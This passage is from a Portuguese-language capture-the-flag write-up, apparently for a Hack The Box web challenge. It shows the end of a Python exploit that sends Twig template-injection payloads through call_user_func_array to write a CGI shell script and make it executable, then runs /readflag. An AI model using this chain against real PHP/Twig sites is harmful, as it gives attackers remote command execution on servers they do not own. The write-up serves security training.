+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    encoded_payload <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(twig_payload)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> encoded_payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_cmd</span>() <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>    bash_script <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;#!/bin/sh
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">echo -ne &#39;Content-Type: text/html</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/readflag
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    twig_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{{&#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;[&#34;file_put_contents&#34;, &#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;[&#34;/www/public/cmd.dizzle&#34;, &#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#34;</span><span style="color:#e6db74">{</span>bash_script<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;]&#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;]|sort(&#34;call_user_func_array&#34;)|join&#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;}}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    encoded_payload <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(twig_payload)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> encoded_payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_chmod</span>() <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{{ [&#39;chmod&#39;, [&#39;/www/public/cmd.dizzle&#39;, &#39;511&#39;]] | sort(&#39;call_user_func_array&#39;) | join }}&#34;</span>
+</span></span><span style="display:flex;"><span>    encoded_payload <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(payload)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> encoded_payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_request</span>(req: requests<span style="color:#f92672">.</span>Session, url: str, payload: str) <span style="color:#f92672">-&gt;</span> requests<span style="color:#f92672">.</span>Response:
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> req<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Usage: python program.py &lt;URL&gt; &lt;PARAM&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">?</span><span style="color:#e6db74">{</span>sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">=&#34;</span>
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 1 - Escrever cmd.dizzle</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Writing cmd.dizzle...&#34;</span>)
+</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> send_request(s, url, write_cmd())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> resp<span style="color:#f92672">.</span>status_code <span style="color:#f92672">!=</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error writing cmd.dizzle: </span><span style="color:#e6db74">{</span>resp<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(resp<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 2 - Escrever htaccess</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Writing .htaccess...&#34;</span>)
+</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> send_request(s, url, write_htaccess())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> resp<span style="color:#f92672">.</span>status_code <span style="color:#f92672">!=</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error writing .htaccess: </span><span style="color:#e6db74">{</span>resp<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(resp<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 3 - Alterar permissões</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Changing permissions...&#34;</span>)
+</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> send_request(s, url, write_chmod())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> resp<span style="color:#f92672">.</span>status_code <span style="color:#f92672">!=</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error changing permissions: </span><span style="color:#e6db74">{</span>resp<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(resp<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 4 - Chamar cmd.dizzle</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Executing cmd.dizzle...&#34;</span>)
+</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">/cmd.dizzle&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> resp<span style="color:#f92672">.</span>status_code <span style="color:#f92672">!=</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error executing cmd.dizzle: </span><span style="color:#e6db74">{</span>resp<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(resp<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Flag obtained:&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(resp<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()</span></span></code></pre></div><p>Primeiro eu testo no container local para saber se funcionou como deveria, e com tudo certo, executo no servidor de produção para conseguir a flag:</p>
+<figure><img src="/assets/image%20%2821%29.png">
+</figure>
+
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/ctf/hack-the-box/challenges-web/breaking-grad/" class="flex align-center">
+        <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#backward"></use></svg>
+        <span>Breaking Grad</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/ctf/hack-the-box/challenges-web/templated/" class="flex align-center">
+        <span>Templated</span>
+        <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#forward"></use></svg>
+      </a>
+    
+    </span>
+  </div>
+
+ 
+        
+  
+ 
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay" aria-hidden="true"></label>
+    </main>
+
+    
+  
+  <aside class="book-toc" aria-label="Table of Contents">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#exploração">Exploração</a>
+      <ul>
+        <li><a href="#funções-não-desabilitadas">Funções não desabilitadas</a></li>
+        <li><a href="#ld_preload">LD_Preload</a></li>
+        <li><a href="#overwrite-disable_functions">Overwrite disable_functions</a></li>
+        <li><a href="#mod-cgi">Mod CGI</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </div>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
